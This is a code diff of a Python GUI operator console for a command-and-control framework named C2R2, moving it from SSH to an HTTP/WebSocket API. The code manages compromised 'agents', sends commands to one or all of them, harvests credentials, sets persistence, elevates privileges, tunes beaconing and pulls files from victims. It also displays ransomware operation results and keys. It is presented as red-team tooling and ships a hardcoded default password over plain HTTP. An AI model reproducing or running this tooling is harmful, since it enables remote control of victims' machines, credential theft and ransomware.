@@ -1,281 +1,375 @@
 #!/usr/bin/env python3
 """
-C2R2 Team Client - GUI Interface for C2R2 Server via SSH
+C2R2 Team Client - GUI Interface for C2R2 Server via HTTP/WebSocket API
 
 This application provides a graphical interface for operators to connect
-to a C2R2 server running on remote infrastructure via SSH tunnel.
+to a C2R2 server using the REST/WebSocket API.
 
-Similar to Havoc Team Client architecture:
-- Server runs on red team infrastructure
-- Operators connect via SSH from their machines
+Architecture similar to Havoc C2, Sliver, and other modern C2 frameworks:
+- Server runs on red team infrastructure with a dedicated API port
+- Operators connect via HTTP/WebSocket from their machines
 - GUI displays connected agents, allows command execution, etc.
 """
 
 import os
 import sys
+import json
 import time
 import queue
-import socket
 import threading
-import re
 from datetime import datetime
 from pathlib import Path
+from typing import Optional, Dict, List, Any
 
 # Tkinter imports (cross-platform GUI)
 import tkinter as tk
 from tkinter import ttk, messagebox, scrolledtext, filedialog
 
-# SSH library
+# HTTP/WebSocket libraries
 try:
-    import paramiko
+    import requests
 except ImportError:
-    print("Error: paramiko is required. Install with: pip install paramiko")
+    print("Error: requests is required. Install with: pip install requests")
+    sys.exit(1)
+
+try:
+    import websocket
+except ImportError:
+    print("Error: websocket-client is required. Install with: pip install websocket-client")
     sys.exit(1)
 
 
-# Pre-compiled regex for ANSI code stripping (performance optimization)
-ANSI_ESCAPE_PATTERN = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
-
-
-class SSHConnection:
-    """Manages SSH connection and port forwarding to C2R2 server."""
+class C2R2ApiClient:
+    """HTTP/WebSocket client for communicating with C2R2 server API."""
     
     def __init__(self):
-        self.ssh_client = None
-        self.channel = None
+        self.base_url: Optional[str] = None
+        self.ws_url: Optional[str] = None
+        self.token: Optional[str] = None
+        self.ws: Optional[websocket.WebSocketApp] = None
         self.connected = False
-        self.server_info = {}
-        self.transport = None
-        self.forwarded_port = None
-        self.local_socket = None
-        self._known_hosts_path = Path.home() / ".ssh" / "known_hosts"
-        
-    def connect(self, host, ssh_port, username, password=None, key_path=None, c2_port=4444):
+        self.on_event: Optional[callable] = None
+        self._ws_thread: Optional[threading.Thread] = None
+        self._running = False
+    
+    def connect(self, host: str, port: int, password: str, username: str = "operator") -> tuple[bool, str]:
         """
-        Connect to the SSH server and set up port forwarding to C2R2 server.
+        Connect to the C2R2 server API.
         
         Args:
-            host: SSH server hostname/IP
-            ssh_port: SSH port (default 22)
-            username: SSH username
-            password: SSH password (if not using key)
-            key_path: Path to SSH private key (if not using password)
-            c2_port: Port where C2R2 server is running (default 4444)
+            host: Server hostname/IP
+            port: API port (default 5555)
+            password: API password
+            username: Username for login
+        
+        Returns:
+            Tuple of (success, message)
         """
+        self.base_url = f"http://{host}:{port}"
+        self.ws_url = f"ws://{host}:{port}/api/events"
+        
         try:
-            self.ssh_client = paramiko.SSHClient()
+            # Login and get token
+            response = requests.post(
+                f"{self.base_url}/api/auth/login",
+                json={"username": username, "password": password},
+                timeout=10
+            )
             
-            # Load known hosts for better security (warn on unknown hosts)
-            # Use RejectPolicy by default, but allow user to accept new hosts
-            if self._known_hosts_path.exists():
-                self.ssh_client.load_host_keys(str(self._known_hosts_path))
-            # For red team tools, we use WarningPolicy to alert but allow connection
-            # This is a balance between security and usability in operational environments
-            self.ssh_client.set_missing_host_key_policy(paramiko.WarningPolicy())
+            if response.status_code != 200:
+                return False, f"Login failed: HTTP {response.status_code}"
             
-            # Connect with either password or key
-            connect_params = {
-                'hostname': host,
-                'port': int(ssh_port),
-                'username': username,
-                'timeout': 30,
-            }
+            data = response.json()
+            if not data.get("success"):
+                return False, data.get("message", "Login failed")
             
-            if key_path and os.path.exists(key_path):
-                connect_params['key_filename'] = key_path
-            elif password:
-                connect_params['password'] = password
-            else:
-                raise ValueError("Either password or SSH key is required")
-            
-            self.ssh_client.connect(**connect_params)
-            self.transport = self.ssh_client.get_transport()
-            
-            # Store connection info
-            self.server_info = {
-                'host': host,
-                'ssh_port': ssh_port,
-                'username': username,
-                'c2_port': c2_port,
-            }
+            self.token = data.get("token")
+            if not self.token:
+                return False, "No token received"
             
             self.connected = True
-            return True, "Connected successfully"
+            return True, f"Connected as {username}"
             
-        except paramiko.AuthenticationException:
-            return False, "Authentication failed. Check username/password/key."
-        except paramiko.SSHException as e:
-            return False, f"SSH error: {str(e)}"
-        except socket.error as e:
-            return False, f"Connection error: {str(e)}"
+        except requests.exceptions.ConnectionError:
+            return False, f"Connection failed: Cannot connect to {host}:{port}"
+        except requests.exceptions.Timeout:
+            return False, "Connection timeout"
         except Exception as e:
             return False, f"Error: {str(e)}"
     
-    def execute_command(self, command):
-        """Execute a command on the remote server."""
-        if not self.connected or not self.ssh_client:
+    def start_event_listener(self, on_event: callable):
+        """Start WebSocket connection for real-time events."""
+        if not self.token:
+            return
+        
+        self.on_event = on_event
+        self._running = True
+        
+        def on_message(ws, message):
+            try:
+                event = json.loads(message)
+                if self.on_event:
+                    self.on_event(event)
+            except json.JSONDecodeError:
+                pass
+        
+        def on_error(ws, error):
+            if self._running:
+                print(f"WebSocket error: {error}")
+        
+        def on_close(ws, close_status_code, close_msg):
+            if self._running:
+                print(f"WebSocket closed: {close_status_code} - {close_msg}")
+        
+        def on_open(ws):
+            print("WebSocket connected")
+        
+        self.ws = websocket.WebSocketApp(
+            self.ws_url,
+            header={"Authorization": f"Bearer {self.token}"},
+            on_message=on_message,
+            on_error=on_error,
+            on_close=on_close,
+            on_open=on_open
+        )
+        
+        self._ws_thread = threading.Thread(target=self.ws.run_forever, daemon=True)
+        self._ws_thread.start()
+    
+    def stop_event_listener(self):
+        """Stop WebSocket connection."""
+        self._running = False
+        if self.ws:
+            self.ws.close()
+    
+    def _headers(self) -> Dict[str, str]:
+        """Get headers with auth token."""
+        return {"Authorization": f"Bearer {self.token}"}
+    
+    def get_agents(self) -> tuple[bool, Any]:
+        """Get list of connected agents."""
+        if not self.connected:
             return False, "Not connected"
         
         try:
-            stdin, stdout, stderr = self.ssh_client.exec_command(command, timeout=60)
-            output = stdout.read().decode('utf-8', errors='replace')
-            error = stderr.read().decode('utf-8', errors='replace')
+            response = requests.get(
+                f"{self.base_url}/api/agents",
+                headers=self._headers(),
+                timeout=10
+            )
             
-            if error and not output:
-                return False, error
-            return True, output + error
+            if response.status_code == 401:
+                return False, "Authentication failed"
+            if response.status_code != 200:
+                return False, f"HTTP {response.status_code}"
             
-        except Exception as e:
-            return False, f"Error executing command: {str(e)}"
-    
-    @staticmethod
-    def _validate_port(port):
-        """Validate that a port number is valid and safe."""
-        try:
-            port_int = int(port)
-            if 1 <= port_int <= 65535:
-                return True, port_int
-            return False, None
-        except (ValueError, TypeError):
-            return False, None
-    
-    @staticmethod
-    def _validate_path(path):
-        """Validate that a path contains only safe characters."""
-        # Allow alphanumeric, /, ., -, _, and ~
-        if not path:
-            return True
-        safe_pattern = re.compile(r'^[a-zA-Z0-9/_.\-~]+$')
-        return bool(safe_pattern.match(path))
-    
-    @staticmethod
-    def _validate_ip(ip):
-        """Validate that an IP address is safe."""
-        safe_pattern = re.compile(r'^[0-9.]+$')
-        return bool(safe_pattern.match(ip))
-    
-    def start_c2_interaction(self, c2_path, c2_port, bind_addr="0.0.0.0", attach_mode=False):
-        """
-        Start or attach to C2R2 server process and capture its stdout/stderr.
-        
-        Args:
-            c2_path: Path to the c2r2-server binary on remote server (can be empty if attach_mode=True)
-            c2_port: Port for the C2R2 server
-            bind_addr: Address to bind the C2 server to
-            attach_mode: If True, attach to existing server via direct TCP connection instead of starting new one
-        """
-        if not self.connected or not self.ssh_client:
-            return False, "Not connected", None
-        
-        # Validate inputs
-        valid, c2_port_int = self._validate_port(c2_port)
-        if not valid or c2_port_int is None:
-            return False, "Invalid port number", None
-        
-        try:
-            if attach_mode:
-                # Connect directly to the running C2R2 server via SSH tunnel
-                # This uses direct-tcpip to forward local socket to remote server port
-                transport = self.ssh_client.get_transport()
-                if not transport:
-                    return False, "SSH transport not available", None
-                
-                self.channel = transport.open_channel(
-                    'direct-tcpip',
-                    (bind_addr, int(c2_port_int)),
-                    ('127.0.0.1', 0)
-                )
-                
-                if not self.channel:
-                    return False, "Failed to connect to C2 server. Is it running?", None
-                
-                self.channel.settimeout(0.5)
-                time.sleep(0.3)
-                
-                return True, f"Attached to C2R2 server at {bind_addr}:{c2_port_int}", self.channel
-            
-            else:
-                # Start new server instance
-                if not c2_path:
-                    return False, "C2 server binary path is required when not in attach mode", None
-                    
-                if not self._validate_path(c2_path):
-                    return False, "Invalid path (contains unsafe characters)", None
-                
-                # Check if server is already running
-                check_cmd = f"pgrep -f 'c2r2-server.*--port.*{c2_port_int}'"
-                stdin, stdout, stderr = self.ssh_client.exec_command(check_cmd, timeout=5)
-                pid_output = stdout.read().decode('utf-8').strip()
-                
-                if pid_output:
-                    return False, f"Server already running (PID: {pid_output}). Enable 'Attach to existing server' option.", None
-                
-                # Start the C2R2 server with stdin/stdout/stderr connected
-                self.channel = self.ssh_client.invoke_shell(
-                    term='xterm',
-                    width=200,
-                    height=50
-                )
-                self.channel.settimeout(0.5)
-                
-                # Wait for shell to be ready
-                time.sleep(0.5)
-                
-                # Clear shell banner
-                try:
-                    while self.channel.recv_ready():
-                        self.channel.recv(4096)
-                except Exception:
-                    pass
-                
-                # Start the C2R2 server
-                start_cmd = f"{c2_path} --bind {bind_addr} --port {c2_port_int}\n"
-                self.channel.send(start_cmd.encode('utf-8'))
-                
-                # Wait for server to start
-                time.sleep(1.5)
-                
-                return True, f"C2R2 server started on {bind_addr}:{c2_port_int}", self.channel
+            data = response.json()
+            return data.get("success", False), data.get("data", {})
             
         except Exception as e:
-            return False, f"Error with C2R2 server: {str(e)}", None
+            return False, str(e)
     
-    def send_to_channel(self, data):
-        """Send data to the interactive channel."""
-        if self.channel:
-            try:
-                self.channel.send(data)
-                return True
-            except Exception as e:
-                return False
-        return False
+    def get_agent(self, agent_id: int) -> tuple[bool, Any]:
+        """Get specific agent info."""
+        if not self.connected:
+            return False, "Not connected"
+        
+        try:
+            response = requests.get(
+                f"{self.base_url}/api/agents/{agent_id}",
+                headers=self._headers(),
+                timeout=10
+            )
+            
+            if response.status_code == 404:
+                return False, "Agent not found"
+            if response.status_code == 401:
+                return False, "Authentication failed"
+            if response.status_code != 200:
+                return False, f"HTTP {response.status_code}"
+            
+            data = response.json()
+            return data.get("success", False), data.get("data", {})
+            
+        except Exception as e:
+            return False, str(e)
     
-    def recv_from_channel(self, size=4096):
-        """Receive data from the interactive channel."""
-        if self.channel:
-            try:
-                if self.channel.recv_ready():
-                    return self.channel.recv(size).decode('utf-8', errors='replace')
-            except socket.timeout:
-                pass
-            except Exception:
-                pass
-        return ""
+    def send_command(self, agent_id: int, command: str) -> tuple[bool, str]:
+        """Send command to an agent."""
+        if not self.connected:
+            return False, "Not connected"
+        
+        try:
+            response = requests.post(
+                f"{self.base_url}/api/agents/{agent_id}/cmd",
+                headers=self._headers(),
+                json={"command": command},
+                timeout=30
+            )
+            
+            if response.status_code == 401:
+                return False, "Authentication failed"
+            if response.status_code == 404:
+                return False, "Agent not found"
+            
+            data = response.json()
+            return data.get("success", False), data.get("message", "Unknown error")
+            
+        except Exception as e:
+            return False, str(e)
+    
+    def send_command_all(self, command: str) -> tuple[bool, Any]:
+        """Send command to all agents."""
+        if not self.connected:
+            return False, "Not connected"
+        
+        try:
+            response = requests.post(
+                f"{self.base_url}/api/agents/all/cmd",
+                headers=self._headers(),
+                json={"command": command},
+                timeout=30
+            )
+            
+            if response.status_code == 401:
+                return False, "Authentication failed"
+            
+            data = response.json()
+            return data.get("success", False), data.get("data", [])
+            
+        except Exception as e:
+            return False, str(e)
+    
+    def download_file(self, agent_id: int, remote_path: str) -> tuple[bool, str]:
+        """Request file download from agent."""
+        if not self.connected:
+            return False, "Not connected"
+        
+        try:
+            response = requests.post(
+                f"{self.base_url}/api/agents/{agent_id}/download",
+                headers=self._headers(),
+                json={"remote_path": remote_path},
+                timeout=30
+            )
+            
+            data = response.json()
+            return data.get("success", False), data.get("message", "Unknown error")
+            
+        except Exception as e:
+            return False, str(e)
+    
+    def harvest_credentials(self, agent_id: int) -> tuple[bool, str]:
+        """Trigger credential harvesting on agent."""
+        if not self.connected:
+            return False, "Not connected"
+        
+        try:
+            response = requests.post(
+                f"{self.base_url}/api/agents/{agent_id}/harvest",
+                headers=self._headers(),
+                timeout=30
+            )
+            
+            data = response.json()
+            return data.get("success", False), data.get("message", "Unknown error")
+            
+        except Exception as e:
+            return False, str(e)
+    
+    def set_persistence(self, agent_id: int, method: str) -> tuple[bool, str]:
+        """Set persistence on agent."""
+        if not self.connected:
+            return False, "Not connected"
+        
+        try:
+            response = requests.post(
+                f"{self.base_url}/api/agents/{agent_id}/persist",
+                headers=self._headers(),
+                json={"method": method},
+                timeout=30
+            )
+            
+            data = response.json()
+            return data.get("success", False), data.get("message", "Unknown error")
+            
+        except Exception as e:
+            return False, str(e)
+    
+    def configure_beacon(self, agent_id: int, interval: int, jitter: int) -> tuple[bool, str]:
+        """Configure beacon timing."""
+        if not self.connected:
+            return False, "Not connected"
+        
+        try:
+            response = requests.post(
+                f"{self.base_url}/api/agents/{agent_id}/beacon",
+                headers=self._headers(),
+                json={"interval": interval, "jitter": jitter},
+                timeout=30
+            )
+            
+            data = response.json()
+            return data.get("success", False), data.get("message", "Unknown error")
+            
+        except Exception as e:
+            return False, str(e)
+    
+    def elevate_agent(self, agent_id: int) -> tuple[bool, str]:
+        """Elevate agent to admin."""
+        if not self.connected:
+            return False, "Not connected"
+        
+        try:
+            response = requests.post(
+                f"{self.base_url}/api/agents/{agent_id}/elevate",
+                headers=self._headers(),
+                timeout=30
+            )
+            
+            data = response.json()
+            return data.get("success", False), data.get("message", "Unknown error")
+            
+        except Exception as e:
+            return False, str(e)
+    
+    def get_server_status(self) -> tuple[bool, Any]:
+        """Get server status."""
+        if not self.base_url:
+            return False, "Not connected"
+        
+        try:
+            response = requests.get(
+                f"{self.base_url}/api/status",
+                timeout=10
+            )
+            
+            if response.status_code != 200:
+                return False, f"HTTP {response.status_code}"
+            
+            return True, response.json()
+            
+        except Exception as e:
+            return False, str(e)
     
     def disconnect(self):
-        """Disconnect from SSH server."""
-        try:
-            if self.channel:
-                self.channel.close()
-            if self.ssh_client:
-                self.ssh_client.close()
-        except Exception:
-            pass
-        finally:
-            self.connected = False
-            self.channel = None
-            self.ssh_client = None
-            self.transport = None
+        """Disconnect from the server."""
+        self.stop_event_listener()
+        
+        if self.connected and self.token:
+            try:
+                requests.post(
+                    f"{self.base_url}/api/auth/logout",
+                    headers=self._headers(),
+                    timeout=5
+                )
+            except Exception:
+                pass
+        
+        self.connected = False
+        self.token = None
+        self.base_url = None
+        self.ws_url = None
 
 
 class C2R2TeamClient:
@@ -311,14 +405,13 @@ class C2R2TeamClient:
         # Configure root
         self.root.configure(bg=self.colors['bg'])
         
-        # Initialize connection
-        self.ssh = SSHConnection()
-        self.output_queue = queue.Queue()
-        self._stop_event = threading.Event()  # Thread-safe stop signal
+        # Initialize API client
+        self.api = C2R2ApiClient()
+        self.event_queue = queue.Queue()
         self.running = True
         self.selected_client = None
-        self.agents = {}  # Dictionary to store connected agents
-        self._agent_tree_items = {}  # Mapping of agent_id to tree item for O(1) lookup
+        self.agents: Dict[int, dict] = {}  # Dictionary to store connected agents
+        self._agent_tree_items: Dict[int, str] = {}  # Mapping of agent_id to tree item
         
         # Create UI
         self._setup_styles()
@@ -330,8 +423,8 @@ class C2R2TeamClient:
         self.main_frame.pack_forget()
         self.login_frame.pack(fill=tk.BOTH, expand=True)
         
-        # Start output processor
-        self.root.after(100, self._process_output_queue)
+        # Start event processor
+        self.root.after(100, self._process_event_queue)
         
         # Handle window close
         self.root.protocol("WM_DELETE_WINDOW", self._on_close)
@@ -418,7 +511,7 @@ class C2R2TeamClient:
         
         subtitle = ttk.Label(
             center_frame,
-            text="Connect to C2R2 Server via SSH",
+            text="Connect to C2R2 Server via API",
             style='Dark.TLabel',
             font=('Consolas', 12)
         )
@@ -428,84 +521,46 @@ class C2R2TeamClient:
         form_frame = ttk.Frame(center_frame, style='Panel.TFrame', padding=30)
         form_frame.pack(padx=20, pady=10)
         
-        # SSH Host (empty by default to force user input)
+        # Server Host
         row = 0
-        ttk.Label(form_frame, text="SSH Host:", style='Panel.TLabel').grid(
+        ttk.Label(form_frame, text="Server Host:", style='Panel.TLabel').grid(
             row=row, column=0, sticky='e', padx=5, pady=8)
         self.host_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
         self.host_entry.grid(row=row, column=1, padx=5, pady=8)
-        # Placeholder text as hint
-        self.host_entry.insert(0, "")
+        self.host_entry.insert(0, "localhost")
         
-        # SSH Port
+        # API Port
         row += 1
-        ttk.Label(form_frame, text="SSH Port:", style='Panel.TLabel').grid(
+        ttk.Label(form_frame, text="API Port:", style='Panel.TLabel').grid(
             row=row, column=0, sticky='e', padx=5, pady=8)
-        self.ssh_port_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
-        self.ssh_port_entry.grid(row=row, column=1, padx=5, pady=8)
-        self.ssh_port_entry.insert(0, "22")
+        self.api_port_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
+        self.api_port_entry.grid(row=row, column=1, padx=5, pady=8)
+        self.api_port_entry.insert(0, "5555")
         
-        # Username (empty by default to force user input)
+        # Username
         row += 1
         ttk.Label(form_frame, text="Username:", style='Panel.TLabel').grid(
             row=row, column=0, sticky='e', padx=5, pady=8)
         self.username_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
         self.username_entry.grid(row=row, column=1, padx=5, pady=8)
-        self.username_entry.insert(0, "")
+        self.username_entry.insert(0, "operator")
         
-        # Password
+        # API Password
         row += 1
-        ttk.Label(form_frame, text="Password:", style='Panel.TLabel').grid(
+        ttk.Label(form_frame, text="API Password:", style='Panel.TLabel').grid(
             row=row, column=0, sticky='e', padx=5, pady=8)
         self.password_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry', show='*')
         self.password_entry.grid(row=row, column=1, padx=5, pady=8)
-        
-        # SSH Key (optional)
-        row += 1
-        ttk.Label(form_frame, text="SSH Key (optional):", style='Panel.TLabel').grid(
-            row=row, column=0, sticky='e', padx=5, pady=8)
-        key_frame = ttk.Frame(form_frame, style='Panel.TFrame')
-        key_frame.grid(row=row, column=1, padx=5, pady=8, sticky='w')
-        self.key_entry = ttk.Entry(key_frame, width=30, style='Dark.TEntry')
-        self.key_entry.pack(side=tk.LEFT)
-        browse_btn = ttk.Button(key_frame, text="Browse", command=self._browse_key)
-        browse_btn.pack(side=tk.LEFT, padx=(5, 0))
-        
-        # C2 Server Port
-        row += 1
-        ttk.Label(form_frame, text="C2 Server Port:", style='Panel.TLabel').grid(
-            row=row, column=0, sticky='e', padx=5, pady=8)
-        self.c2_port_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
-        self.c2_port_entry.grid(row=row, column=1, padx=5, pady=8)
-        self.c2_port_entry.insert(0, "4444")
-        
-        # C2 Server Path (required)
-        row += 1
-        ttk.Label(form_frame, text="C2 Binary Path:", style='Panel.TLabel').grid(
-            row=row, column=0, sticky='e', padx=5, pady=8)
-        self.c2_path_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
-        self.c2_path_entry.grid(row=row, column=1, padx=5, pady=8)
-        self.c2_path_entry.insert(0, "./c2r2-server-arm64")
+        self.password_entry.insert(0, "c2r2-secret")
         
         row += 1
         hint_label = ttk.Label(
             form_frame, 
-            text="(Path to c2r2-server binary - leave empty if already running)",
+            text="(Default password is 'c2r2-secret' - change with --api-password flag on server)",
             style='Panel.TLabel',
             font=('Consolas', 9)
         )
         hint_label.grid(row=row, column=1, sticky='w', padx=5)
-        
-        # Attach to existing server checkbox
-        row += 1
-        self.attach_var = tk.BooleanVar(value=True)
-        attach_check = ttk.Checkbutton(
-            form_frame,
-            text="Attach to existing server (don't start new instance)",
-            variable=self.attach_var,
-            style='Panel.TLabel'
-        )
-        attach_check.grid(row=row, column=1, sticky='w', padx=5, pady=5)
         
         # Connect button
         row += 1
@@ -685,7 +740,7 @@ class C2R2TeamClient:
         send_btn.pack(side=tk.RIGHT)
         
         # Command history
-        self.cmd_history = []
+        self.cmd_history: List[str] = []
         self.history_index = -1
         
         # Quick actions frame
@@ -715,37 +770,19 @@ class C2R2TeamClient:
             )
             btn.pack(side=tk.LEFT, padx=2)
     
-    def _browse_key(self):
-        """Open file dialog to select SSH key."""
-        filename = filedialog.askopenfilename(
-            title="Select SSH Private Key",
-            filetypes=[("All files", "*"), ("PEM files", "*.pem"), ("Key files", "*.key")]
-        )
-        if filename:
-            self.key_entry.delete(0, tk.END)
-            self.key_entry.insert(0, filename)
-    
     def _connect(self):
-        """Handle connection to SSH server."""
+        """Handle connection to API server."""
         host = self.host_entry.get().strip()
-        ssh_port = self.ssh_port_entry.get().strip()
+        port = self.api_port_entry.get().strip()
         username = self.username_entry.get().strip()
         password = self.password_entry.get()
-        key_path = self.key_entry.get().strip()
-        c2_port = self.c2_port_entry.get().strip()
-        c2_path = self.c2_path_entry.get().strip()
-        attach_mode = self.attach_var.get()
         
-        if not host or not username:
-            self.login_status.config(text="❌ Host and username are required", foreground=self.colors['error'])
+        if not host:
+            self.login_status.config(text="❌ Host is required", foreground=self.colors['error'])
             return
         
-        if not password and not key_path:
-            self.login_status.config(text="❌ Password or SSH key is required", foreground=self.colors['error'])
-            return
-        
-        if not attach_mode and not c2_path:
-            self.login_status.config(text="❌ C2 binary path is required (or enable Attach mode)", foreground=self.colors['error'])
+        if not password:
+            self.login_status.config(text="❌ Password is required", foreground=self.colors['error'])
             return
         
         self.login_status.config(text="⏳ Connecting...", foreground=self.colors['warning'])
@@ -754,28 +791,94 @@ class C2R2TeamClient:
         
         # Connect in a separate thread to avoid blocking UI
         def connect_thread():
-            success, message = self.ssh.connect(
-                host, ssh_port, username, 
-                password=password if password else None,
-                key_path=key_path if key_path else None,
-                c2_port=int(c2_port)
-            )
+            try:
+                port_int = int(port)
+            except ValueError:
+                self.root.after(0, lambda: self._on_connect_fail("Invalid port number"))
+                return
+            
+            success, message = self.api.connect(host, port_int, password, username)
             
             if success:
-                # Start or attach to the C2R2 server
-                ok, msg, _ = self.ssh.start_c2_interaction(c2_path, int(c2_port), attach_mode=attach_mode)
-                
-                if ok:
-                    self.root.after(0, lambda: self._on_connect_success(host, c2_port))
-                else:
-                    self.root.after(0, lambda: self._on_connect_fail(msg))
+                # Start event listener
+                self.api.start_event_listener(self._on_server_event)
+                self.root.after(0, lambda: self._on_connect_success(host, port_int))
             else:
                 self.root.after(0, lambda: self._on_connect_fail(message))
         
         thread = threading.Thread(target=connect_thread, daemon=True)
         thread.start()
     
-    def _on_connect_success(self, host, port):
+    def _on_server_event(self, event: dict):
+        """Handle events from the WebSocket."""
+        self.event_queue.put(event)
+    
+    def _process_event_queue(self):
+        """Process events from the queue (runs in main thread)."""
+        try:
+            while True:
+                event = self.event_queue.get_nowait()
+                self._handle_event(event)
+        except queue.Empty:
+            pass
+        
+        if self.running:
+            self.root.after(100, self._process_event_queue)
+    
+    def _handle_event(self, event: dict):
+        """Handle a server event."""
+        event_type = event.get("type")
+        data = event.get("data", {})
+        
+        if event_type == "AgentConnected":
+            self._update_agent(data)
+            self._log_console(f"✅ Agent {data.get('id')} connected from {data.get('addr')}\n", 'success')
+        
+        elif event_type == "AgentDisconnected":
+            agent_id = data.get("id")
+            self._remove_agent(agent_id)
+            self._log_console(f"❌ Agent {agent_id} disconnected\n", 'error')
+        
+        elif event_type == "AgentUpdated":
+            self._update_agent(data)
+        
+        elif event_type == "CommandOutput":
+            agent_id = data.get("agent_id")
+            output = data.get("output", "")
+            is_error = data.get("is_error", False)
+            tag = 'error' if is_error else None
+            self._log_console(f"📨 [{agent_id}]: {output}\n", tag)
+        
+        elif event_type == "FileDownloaded":
+            self._log_console(
+                f"📥 File downloaded from agent {data.get('agent_id')}: "
+                f"{data.get('filename')} ({data.get('size')} bytes) -> {data.get('save_path')}\n",
+                'success'
+            )
+        
+        elif event_type == "CredentialsHarvested":
+            self._log_console(
+                f"🔑 Credentials harvested from agent {data.get('agent_id')}: "
+                f"{data.get('count')} entries -> {data.get('save_path')}\n",
+                'success'
+            )
+        
+        elif event_type == "RansomwareResult":
+            self._log_console(
+                f"🔐 Ransomware {data.get('operation')} on agent {data.get('agent_id')}: "
+                f"{data.get('result')}\n",
+                'warning'
+            )
+            if data.get("key"):
+                self._log_console(f"   Key: {data.get('key')}\n", 'warning')
+        
+        elif event_type == "ServerMessage":
+            level = data.get("level", "info")
+            message = data.get("message", "")
+            tag = {'info': 'info', 'warning': 'warning', 'error': 'error'}.get(level, None)
+            self._log_console(f"ℹ️ Server: {message}\n", tag)
+    
+    def _on_connect_success(self, host: str, port: int):
         """Handle successful connection."""
         self.login_frame.pack_forget()
         self.main_frame.pack(fill=tk.BOTH, expand=True)
@@ -789,26 +892,18 @@ class C2R2TeamClient:
         self._log_console(f"✅ Connected to C2R2 Server at {host}:{port}\n", 'success')
         self._log_console("Type /help for available commands\n", 'info')
         
-        # Start receiver thread
-        self._stop_event.clear()  # Reset stop event
-        self.receiver_thread = threading.Thread(target=self._receive_data, daemon=True)
-        self.receiver_thread.start()
-        
-        # Request initial client list
-        self.root.after(1000, lambda: self._send_raw_command("/list\n"))
+        # Load initial agent list
+        self._refresh_agents()
     
-    def _on_connect_fail(self, message):
+    def _on_connect_fail(self, message: str):
         """Handle connection failure."""
         self.login_status.config(text=f"❌ {message}", foreground=self.colors['error'])
         self.connect_btn.config(state=tk.NORMAL)
     
     def _disconnect(self):
-        """Disconnect from SSH server."""
-        # Signal receiver thread to stop
-        self._stop_event.set()
-        self.running = False
+        """Disconnect from the server."""
+        self.api.disconnect()
         
-        self.ssh.disconnect()
         self.main_frame.pack_forget()
         self.login_frame.pack(fill=tk.BOTH, expand=True)
         self.login_status.config(text="")
@@ -821,75 +916,81 @@ class C2R2TeamClient:
         self._agent_tree_items.clear()
         self.selected_client = None
         self._update_prompt()
+    
+    def _refresh_agents(self):
+        """Refresh the agents list from the server."""
+        if not self.api.connected:
+            return
         
-        # Reset running flag for next connection
-        self.running = True
-    
-    def _receive_data(self):
-        """Thread to receive data from SSH channel."""
-        buffer = ""
-        while not self._stop_event.is_set() and self.ssh.connected:
-            try:
-                data = self.ssh.recv_from_channel()
-                if data:
-                    buffer += data
-                    
-                    # Process complete lines
-                    while '\n' in buffer:
-                        line, buffer = buffer.split('\n', 1)
-                        self.output_queue.put(line)
-                
-                time.sleep(0.1)
-            except Exception as e:
-                if not self._stop_event.is_set():
-                    self.output_queue.put(f"Error receiving data: {e}")
-                break
-    
-    def _process_output_queue(self):
-        """Process output from the queue (runs in main thread)."""
-        try:
-            while True:
-                line = self.output_queue.get_nowait()
-                self._process_line(line)
-        except queue.Empty:
-            pass
+        def refresh_thread():
+            success, data = self.api.get_agents()
+            if success:
+                agents_list = data.get("agents", [])
+                self.root.after(0, lambda: self._update_agents_list(agents_list))
+            else:
+                self.root.after(0, lambda: self._log_console(f"❌ Failed to refresh agents: {data}\n", 'error'))
         
-        if self.running:
-            self.root.after(100, self._process_output_queue)
+        threading.Thread(target=refresh_thread, daemon=True).start()
     
-    def _process_line(self, line):
-        """Process a line of output from the server."""
-        # Strip ANSI codes for processing but keep for display
-        clean_line = self._strip_ansi(line)
+    def _update_agents_list(self, agents_list: List[dict]):
+        """Update the agents list from server response."""
+        # Clear current list
+        for item in self.agents_tree.get_children():
+            self.agents_tree.delete(item)
+        self.agents.clear()
+        self._agent_tree_items.clear()
         
-        # Parse client list output
-        if '│' in clean_line and clean_line.count('│') >= 6:
-            # This might be a table row
-            parts = [p.strip() for p in clean_line.split('│')]
-            if len(parts) >= 7:
-                try:
-                    # Try to parse as agent info
-                    agent_id = parts[1].strip()
-                    if agent_id.isdigit():
-                        self._update_agent({
-                            'id': agent_id,
-                            'addr': parts[2].strip(),
-                            'hostname': parts[3].strip(),
-                            'username': parts[4].strip(),
-                            'os': parts[5].strip(),
-                            'privileges': parts[6].strip(),
-                        })
-                except (IndexError, ValueError):
-                    pass
+        # Add agents
+        for agent in agents_list:
+            self._update_agent(agent)
+    
+    def _update_agent(self, agent_info: dict):
+        """Update or add an agent to the tree."""
+        agent_id = agent_info.get('id')
+        if agent_id is None:
+            return
         
-        # Log to console
-        self._log_console(line + '\n')
+        # Check if agent already exists
+        if agent_id in self._agent_tree_items:
+            item = self._agent_tree_items[agent_id]
+            if self.agents_tree.exists(item):
+                self.agents_tree.item(item, values=(
+                    agent_id,
+                    agent_info.get('hostname') or agent_info.get('addr', '...'),
+                    agent_info.get('username', '...'),
+                    agent_info.get('os_version', '...'),
+                    agent_info.get('privileges', '...')
+                ))
+                self.agents[agent_id] = agent_info
+                return
+        
+        # Add new agent
+        item = self.agents_tree.insert('', tk.END, values=(
+            agent_id,
+            agent_info.get('hostname') or agent_info.get('addr', '...'),
+            agent_info.get('username', '...'),
+            agent_info.get('os_version', '...'),
+            agent_info.get('privileges', '...')
+        ))
+        self._agent_tree_items[agent_id] = item
+        self.agents[agent_id] = agent_info
     
-    def _strip_ansi(self, text):
-        """Remove ANSI escape codes from text (uses pre-compiled pattern for performance)."""
-        return ANSI_ESCAPE_PATTERN.sub('', text)
+    def _remove_agent(self, agent_id: int):
+        """Remove an agent from the tree."""
+        if agent_id in self._agent_tree_items:
+            item = self._agent_tree_items[agent_id]
+            if self.agents_tree.exists(item):
+                self.agents_tree.delete(item)
+            del self._agent_tree_items[agent_id]
+        
+        if agent_id in self.agents:
+            del self.agents[agent_id]
+        
+        if self.selected_client == agent_id:
+            self.selected_client = None
+            self._update_prompt()
     
